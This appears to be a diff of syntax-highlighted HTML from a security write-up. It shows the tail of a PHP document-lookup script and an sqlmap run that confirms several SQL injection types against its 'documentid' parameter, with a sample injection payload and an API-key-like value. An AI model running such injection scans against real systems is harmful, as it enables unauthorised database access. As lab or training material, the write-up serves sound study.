class="w"> </span><span class="s2">&quot;ANDVOWLDLAS5Q8OQZ2tu&quot;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>substr<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;apikey&#39;</span><span class="o">]</span>,<span class="w"> </span><span class="m">0</span>,<span class="w"> </span><span class="m">20</span><span class="o">)</span><span class="w"> </span>!<span class="o">==</span><span class="w"> </span><span class="s2">&quot;GITtFi80llzs..................&quot;</span><span class="o">))</span>
+<span class="o">{</span>
+<span class="w">    </span>die<span class="o">(</span><span class="s2">&quot;Invalid API key&quot;</span><span class="o">)</span><span class="p">;</span>
+<span class="o">}</span>
 
-if (!isset($_GET['documentid']))
-{
-    die(&quot;Invalid document ID&quot;);
-}
+<span class="k">if</span><span class="w"> </span><span class="o">(</span>!isset<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;documentid&#39;</span><span class="o">]))</span>
+<span class="o">{</span>
+<span class="w">    </span>die<span class="o">(</span><span class="s2">&quot;Invalid document ID&quot;</span><span class="o">)</span><span class="p">;</span>
+<span class="o">}</span>
 
 /*
-if (!isset($_GET['newname']) || $_GET['newname'] == &quot;&quot;)
-{
-    die(&quot;invalid document name&quot;);
-}
+<span class="k">if</span><span class="w"> </span><span class="o">(</span>!isset<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;newname&#39;</span><span class="o">])</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;newname&#39;</span><span class="o">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="o">)</span>
+<span class="o">{</span>
+<span class="w">    </span>die<span class="o">(</span><span class="s2">&quot;invalid document name&quot;</span><span class="o">)</span><span class="p">;</span>
+<span class="o">}</span>
 */
 
-$conn = setup_db_connection();
+<span class="nv">$conn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>setup_db_connection<span class="o">()</span><span class="p">;</span>
 
-//UpdateDocumentName($conn, $_GET['documentid'], $_GET['newname']);
+//UpdateDocumentName<span class="o">(</span><span class="nv">$conn</span>,<span class="w"> </span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;documentid&#39;</span><span class="o">]</span>,<span class="w"> </span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;newname&#39;</span><span class="o">])</span><span class="p">;</span>
 
-$docDetails = GetDocumentDetails($conn, $_GET['documentid']);
-if ($docDetails !== null)
-{
-    //print_r($docDetails);
-    echo (&quot;Document ID: &quot;.$docDetails['documentid'].&quot;&lt;br /&gt;&quot;);
-    echo (&quot;Document Name: &quot;.$docDetails['documentname'].&quot;&lt;br /&gt;&quot;);
-    echo (&quot;Document Location: &quot;.$docDetails['location'].&quot;&lt;br /&gt;&quot;);
-}
+<span class="nv">$docDetails</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>GetDocumentDetails<span class="o">(</span><span class="nv">$conn</span>,<span class="w"> </span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;documentid&#39;</span><span class="o">])</span><span class="p">;</span>
+<span class="k">if</span><span class="w"> </span><span class="o">(</span><span class="nv">$docDetails</span><span class="w"> </span>!<span class="o">==</span><span class="w"> </span>null<span class="o">)</span>
+<span class="o">{</span>
+<span class="w">    </span>//print_r<span class="o">(</span><span class="nv">$docDetails</span><span class="o">)</span><span class="p">;</span>
+<span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="o">(</span><span class="s2">&quot;Document ID: &quot;</span>.<span class="nv">$docDetails</span><span class="o">[</span><span class="s1">&#39;documentid&#39;</span><span class="o">]</span>.<span class="s2">&quot;&lt;br /&gt;&quot;</span><span class="o">)</span><span class="p">;</span>
+<span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="o">(</span><span class="s2">&quot;Document Name: &quot;</span>.<span class="nv">$docDetails</span><span class="o">[</span><span class="s1">&#39;documentname&#39;</span><span class="o">]</span>.<span class="s2">&quot;&lt;br /&gt;&quot;</span><span class="o">)</span><span class="p">;</span>
+<span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="o">(</span><span class="s2">&quot;Document Location: &quot;</span>.<span class="nv">$docDetails</span><span class="o">[</span><span class="s1">&#39;location&#39;</span><span class="o">]</span>.<span class="s2">&quot;&lt;br /&gt;&quot;</span><span class="o">)</span><span class="p">;</span>
+<span class="o">}</span>
 
 ?&gt;
 
 ----------------------------------------
-</code></pre>
+</code></pre></div>
 
-<pre class="codehilite"><code>└─$ sqlmap -r r.txt --dbs --batch
+<div class="codehilite"><pre><span></span><code><span class="err">└─$</span><span class="w"> </span><span class="n">sqlmap</span><span class="w"> </span><span class="o">-</span><span class="n">r</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="o">--</span><span class="n">dbs</span><span class="w"> </span><span class="o">--</span><span class="n">batch</span>
 
-        ___
-       __H__
- ___ ___[)]_____ ___ ___  {1.9.8#stable}
-|_ -| . [)]     | .'| . |
-|___|_  [&quot;]_|_|_|__,|  _|
-      |_|V...       |_|   https://sqlmap.org
+<span class="w">        </span><span class="n">___</span>
+<span class="w">       </span><span class="n">__H__</span>
+<span class="w"> </span><span class="n">___</span><span class="w"> </span><span class="n">___</span><span class="o">[</span><span class="n">)</span><span class="o">]</span><span class="n">_____</span><span class="w"> </span><span class="n">___</span><span class="w"> </span><span class="n">___</span><span class="w">  </span><span class="err">{</span><span class="mf">1.9.8</span><span class="n">#stable</span><span class="err">}</span>
+<span class="o">|</span><span class="n">_</span><span class="w"> </span><span class="o">-|</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="o">[</span><span class="n">)</span><span class="o">]</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="p">.</span><span class="s1">&#39;| . |</span>
+<span class="s1">|___|_  [&quot;]_|_|_|__,|  _|</span>
+<span class="s1">      |_|V...       |_|   https://sqlmap.org</span>
 
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+<span class="s1">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;</span><span class="n">s</span><span class="w"> </span><span class="n">responsibility</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">obey</span><span class="w"> </span><span class="ow">all</span><span class="w"> </span><span class="n">applicable</span><span class="w"> </span><span class="k">local</span><span class="p">,</span><span class="w"> </span><span class="k">state</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">federal</span><span class="w"> </span><span class="n">laws</span><span class="p">.</span><span class="w"> </span><span class="n">Developers</span><span class="w"> </span><span class="n">assume</span><span class="w"> </span><span class="k">no</span><span class="w"> </span><span class="n">liability</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="k">are</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">responsible</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="ow">any</span><span class="w"> </span><span class="n">misuse</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">damage</span><span class="w"> </span><span class="n">caused</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">program</span>
 
-[*] starting @ 18:30:39 /2026-01-01/
+<span class="o">[</span><span class="n">*</span><span class="o">]</span><span class="w"> </span><span class="n">starting</span><span class="w"> </span><span class="err">@</span><span class="w"> </span><span class="mi">18</span><span class="err">:</span><span class="mi">30</span><span class="err">:</span><span class="mi">39</span><span class="w"> </span><span class="o">/</span><span class="mi">2026</span><span class="o">-</span><span class="mi">01</span><span class="o">-</span><span class="mi">01</span><span class="o">/</span>
 
-[18:30:39] [INFO] parsing HTTP request from 'r.txt'
-[18:30:40] [INFO] testing connection to the target URL
-[18:30:41] [INFO] checking if the target is protected by some kind of WAF/IPS
-[18:30:42] [INFO] testing if the target URL content is stable
-[18:30:43] [INFO] target URL content is stable
-[18:30:43] [INFO] testing if GET parameter 'documentid' is dynamic
-[18:30:44] [INFO] GET parameter 'documentid' appears to be dynamic
-[18:30:44] [INFO] heuristic (basic) test shows that GET parameter 'documentid' might be injectable (possible DBMS: 'MySQL')
-[18:30:45] [INFO] heuristic (XSS) test shows that GET parameter 'documentid' might be vulnerable to cross-site scripting (XSS) attacks
-[18:30:45] [INFO] testing for SQL injection on GET parameter 'documentid'
-it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
-for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
-[18:30:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
-[18:30:45] [WARNING] reflective value(s) found and filtering out
-[18:30:47] [INFO] GET parameter 'documentid' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string=&quot;Document&quot;)
-[18:30:47] [INFO] testing 'Generic inline queries'
-[18:30:48] [INFO] testing 'MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
-[18:30:49] [INFO] testing 'MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
-[18:30:49] [INFO] testing 'MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
-[18:30:50] [INFO] testing 'MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
-[18:30:51] [INFO] testing 'MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
-[18:30:52] [INFO] GET parameter 'documentid' is 'MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
-[18:30:52] [INFO] testing 'MySQL inline queries'
-[18:30:52] [INFO] testing 'MySQL &gt;= 5.0.12 stacked queries (comment)'
-[18:30:52] [WARNING] time-based comparison requires larger statistical model, please wait............... (done)                                          
-[18:31:04] [INFO] testing 'MySQL &gt;= 5.0.12 stacked queries'
-[18:31:04] [INFO] testing 'MySQL &gt;= 5.0.12 stacked queries (query SLEEP - comment)'
-[18:31:05] [INFO] testing 'MySQL &gt;= 5.0.12 stacked queries (query SLEEP)'
-[18:31:05] [INFO] testing 'MySQL &lt; 5.0.12 stacked queries (BENCHMARK - comment)'
-[18:31:06] [INFO] testing 'MySQL &lt; 5.0.12 stacked queries (BENCHMARK)'
-[18:31:06] [INFO] testing 'MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)'
-[18:31:19] [INFO] GET parameter 'documentid' appears to be 'MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)' injectable 
-[18:31:19] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
-[18:31:19] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
-[18:31:20] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
-[18:31:22] [INFO] target URL appears to have 3 columns in query
-[18:31:26] [INFO] GET parameter 'documentid' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
-GET parameter 'documentid' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
-sqlmap identified the following injection point(s) with a total of 50 HTTP(s) requests:
----
-Parameter: documentid (GET)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: documentid=1 AND 7918=7918&amp;apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD
+<span class="o">[</span><span class="n">18:30:39</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="n">parsing</span><span class="w"> </span><span class="n">HTTP</span><span class="w"> </span><span class="n">request</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="s1">&#39;r.txt&#39;</span>
+<span class="o">[</span><span class="n">18:30:40</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="n">testing</span><span class="w"> </span><span class="k">connection</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="n">URL</span>
+<span class="o">[</span><span class="n">18:30:41</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="n">checking</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">protected</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="ow">some</span><span class="w"> </span><span class="n">kind</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">WAF</span><span class="o">/</span><span class="n">IPS</span>
+<span class="o">[</span><span class="n">18:30:42</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="n">testing</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="n">URL</span><span class="w"> </span><span class="n">content</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">stable</span>
+<span class="o">[</span><span class="n">18:30:43</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="n">URL</span><span class="w"> </span><span class="n">content</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">stable</span>
+<span class="o">[</span><span class="n">18:30:43</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="n">testing</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="k">GET</span><span class="w"> </span><span class="k">parameter</span><span class="w"> </span><span class="s1">&#39;documentid&#39;</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="k">dynamic</span>
+<span class="o">[</span><span class="n">18:30:44</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="k">GET</span><span class="w"> </span><span class="k">parameter</span><span class="w"> </span><span class="s1">&#39;documentid&#39;</span><span class="w"> </span><span class="n">appears</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="k">dynamic</span>
+<span class="o">[</span><span class="n">18:30:44</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="n">heuristic</span><span class="w"> </span><span class="p">(</span><span class="n">basic</span><span class="p">)</span><span class="w"> </span><span class="n">test</span><span class="w"> </span><span class="n">shows</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="k">GET</span><span class="w"> </span><span class="k">parameter</span><span class="w"> </span><span class="s1">&#39;documentid&#39;</span><span class="w"> </span><span class="n">might</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">injectable</span><span class="w"> </span><span class="p">(</span><span class="n">possible</span><span class="w"> </span><span class="nl">DBMS</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;MySQL&#39;</span><span class="p">)</span>
+<span class="o">[</span><span class="n">18:30:45</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="n">heuristic</span><span class="w"> </span><span class="p">(</span><span class="n">XSS</span><span class="p">)</span><span class="w"> </span><span class="n">test</span><span class="w"> </span><span class="n">shows</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="k">GET</span><span class="w"> </span><span class="k">parameter</span><span class="w"> </span><span class="s1">&#39;documentid&#39;</span><span class="w"> </span><span class="n">might</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">vulnerable</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">cross</span><span class="o">-</span><span class="n">site</span><span class="w"> </span><span class="n">scripting</span><span class="w"> </span><span class="p">(</span><span class="n">XSS</span><span class="p">)</span><span class="w"> </span><span class="n">attacks</span>
+<span class="o">[</span><span class="n">18:30:45</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="n">testing</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">SQL</span><span class="w"> </span><span class="n">injection</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="k">GET</span><span class="w"> </span><span class="k">parameter</span><span class="w"> </span><span class="s1">&#39;documentid&#39;</span>
+<span class="n">it</span><span class="w"> </span><span class="n">looks</span><span class="w"> </span><span class="ow">like</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">back</span><span class="o">-</span><span class="k">end</span><span class="w"> </span><span class="n">DBMS</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="s1">&#39;MySQL&#39;</span><span class="p">.</span><span class="w"> </span><span class="n">Do</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">want</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">skip</span><span class="w"> </span><span class="n">test</span><span class="w"> </span><span class="n">payloads</span><span class="w"> </span><span class="k">specific</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">other</span><span class="w"> </span><span class="n">DBMSes</span><span class="vm">?</span><span class="w"> </span><span class="o">[</span><span class="n">Y/n</span><span class="o">]</span><span class="w"> </span><span class="n">Y</span>
+<span class="k">for</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">remaining</span><span class="w"> </span><span class="n">tests</span><span class="p">,</span><span class="w"> </span><span class="n">do</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">want</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="k">include</span><span class="w"> </span><span class="ow">all</span><span class="w"> </span><span class="n">tests</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="s1">&#39;MySQL&#39;</span><span class="w"> </span><span class="n">extending</span><span class="w"> </span><span class="n">provided</span><span class="w"> </span><span class="k">level</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">risk</span><span class="w"> </span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="k">values</span><span class="vm">?</span><span class="w"> </span><span class="o">[</span><span class="n">Y/n</span><span class="o">]</span><span class="w"> </span><span class="n">Y</span>
+<span class="o">[</span><span class="n">18:30:45</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="n">testing</span><span class="w"> </span><span class="s1">&#39;AND boolean-based blind - WHERE or HAVING clause&#39;</span>
+<span class="o">[</span><span class="n">18:30:45</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">WARNING</span><span class="o">]</span><span class="w"> </span><span class="n">reflective</span><span class="w"> </span><span class="k">value</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="w"> </span><span class="k">found</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">filtering</span><span class="w"> </span><span class="k">out</span>
+<span class="o">[</span><span class="n">18:30:47</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="k">GET</span><span class="w"> </span><span class="k">parameter</span><span class="w"> </span><span class="s1">&#39;documentid&#39;</span><span class="w"> </span><span class="n">appears</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="s1">&#39;AND boolean-based blind - WHERE or HAVING clause&#39;</span><span class="w"> </span><span class="n">injectable</span><span class="w"> </span><span class="p">(</span><span class="k">with</span><span class="w"> </span><span class="o">--</span><span class="n">string</span><span class="o">=</span><span class="ss">&quot;Document&quot;</span><span class="p">)</span>
+<span class="o">[</span><span class="n">18:30:47</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="n">testing</span><span class="w"> </span><span class="s1">&#39;Generic inline queries&#39;</span>
+<span class="o">[</span><span class="n">18:30:48</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="n">testing</span><span class="w"> </span><span class="s1">&#39;MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)&#39;</span>
+<span class="o">[</span><span class="n">18:30:49</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="n">testing</span><span class="w"> </span><span class="s1">&#39;MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)&#39;</span>
+<span class="o">[</span><span class="n">18:30:49</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="n">testing</span><span class="w"> </span><span class="s1">&#39;MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)&#39;</span>
+<span class="o">[</span><span class="n">18:30:50</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="n">testing</span><span class="w"> </span><span class="s1">&#39;MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (EXP)&#39;</span>
+<span class="o">[</span><span class="n">18:30:51</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="n">testing</span><span class="w"> </span><span class="s1">&#39;MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)&#39;</span>
+<span class="o">[</span><span class="n">18:30:52</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="k">GET</span><span class="w"> </span><span class="k">parameter</span><span class="w"> </span><span class="s1">&#39;documentid&#39;</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="s1">&#39;MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)&#39;</span><span class="w"> </span><span class="n">injectable</span><span class="w"> </span>
+<span class="o">[</span><span class="n">18:30:52</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="n">testing</span><span class="w"> </span><span class="s1">&#39;MySQL inline queries&#39;</span>
+<span class="o">[</span><span class="n">18:30:52</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="n">testing</span><span class="w"> </span><span class="s1">&#39;MySQL &gt;= 5.0.12 stacked queries (comment)&#39;</span>
+<span class="o">[</span><span class="n">18:30:52</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">WARNING</span><span class="o">]</span><span class="w"> </span><span class="nc">time</span><span class="o">-</span><span class="n">based</span><span class="w"> </span><span class="n">comparison</span><span class="w"> </span><span class="n">requires</span><span class="w"> </span><span class="n">larger</span><span class="w"> </span><span class="n">statistical</span><span class="w"> </span><span class="n">model</span><span class="p">,</span><span class="w"> </span><span class="n">please</span><span class="w"> </span><span class="n">wait</span><span class="p">...............</span><span class="w"> </span><span class="p">(</span><span class="n">done</span><span class="p">)</span><span class="w">                                          </span>
+<span class="o">[</span><span class="n">18:31:04</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="n">testing</span><span class="w"> </span><span class="s1">&#39;MySQL &gt;= 5.0.12 stacked queries&#39;</span>
+<span class="o">[</span><span class="n">18:31:04</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="n">testing</span><span class="w"> </span><span class="s1">&#39;MySQL &gt;= 5.0.12 stacked queries (query SLEEP - comment)&#39;</span>
+<span class="o">[</span><span class="n">18:31:05</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="n">testing</span><span class="w"> </span><span class="s1">&#39;MySQL &gt;= 5.0.12 stacked queries (query SLEEP)&#39;</span>
+<span class="o">[</span><span class="n">18:31:05</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="n">testing</span><span class="w"> </span><span class="s1">&#39;MySQL &lt; 5.0.12 stacked queries (BENCHMARK - comment)&#39;</span>
+<span class="o">[</span><span class="n">18:31:06</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="n">testing</span><span class="w"> </span><span class="s1">&#39;MySQL &lt; 5.0.12 stacked queries (BENCHMARK)&#39;</span>
+<span class="o">[</span><span class="n">18:31:06</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="n">testing</span><span class="w"> </span><span class="s1">&#39;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#39;</span>
+<span class="o">[</span><span class="n">18:31:19</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="k">GET</span><span class="w"> </span><span class="k">parameter</span><span class="w"> </span><span class="s1">&#39;documentid&#39;</span><span class="w"> </span><span class="n">appears</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="s1">&#39;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#39;</span><span class="w"> </span><span class="n">injectable</span><span class="w"> </span>
+<span class="o">[</span><span class="n">18:31:19</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="n">testing</span><span class="w"> </span><span class="s1">&#39;Generic UNION query (NULL) - 1 to 20 columns&#39;</span>
+<span class="o">[</span><span class="n">18:31:19</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="n">automatically</span><span class="w"> </span><span class="n">extending</span><span class="w"> </span><span class="n">ranges</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="ow">UNION</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="n">injection</span><span class="w"> </span><span class="n">technique</span><span class="w"> </span><span class="n">tests</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">there</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="n">least</span><span class="w"> </span><span class="n">one</span><span class="w"> </span><span class="n">other</span><span class="w"> </span><span class="p">(</span><span class="n">potential</span><span class="p">)</span><span class="w"> </span><span class="n">technique</span><span class="w"> </span><span class="k">found</span>
+<span class="o">[</span><span class="n">18:31:20</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="s1">&#39;ORDER BY&#39;</span><span class="w"> </span><span class="n">technique</span><span class="w"> </span><span class="n">appears</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">usable</span><span class="p">.</span><span class="w"> </span><span class="n">This</span><span class="w"> </span><span class="n">should</span><span class="w"> </span><span class="n">reduce</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="nc">time</span><span class="w"> </span><span class="n">needed</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">find</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="nf">right</span><span class="w"> </span><span class="n">number</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="n">columns</span><span class="p">.</span><span class="w"> </span><span class="n">Automatically</span><span class="w"> </span><span class="n">extending</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="k">range</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="k">current</span><span class="w"> </span><span class="ow">UNION</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="n">injection</span><span class="w"> </span><span class="n">technique</span><span class="w"> </span><span class="n">test</span>
+<span class="o">[</span><span class="n">18:31:22</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="n">target</span><span class="w"> </span><span class="n">URL</span><span class="w"> </span><span class="n">appears</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">have</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="n">columns</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">query</span>
+<span class="o">[</span><span class="n">18:31:26</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="k">GET</span><span class="w"> </span><span class="k">parameter</span><span class="w"> </span><span class="s1">&#39;documentid&#39;</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="s1">&#39;Generic UNION query (NULL) - 1 to 20 columns&#39;</span><span class="w"> </span><span class="n">injectable</span>
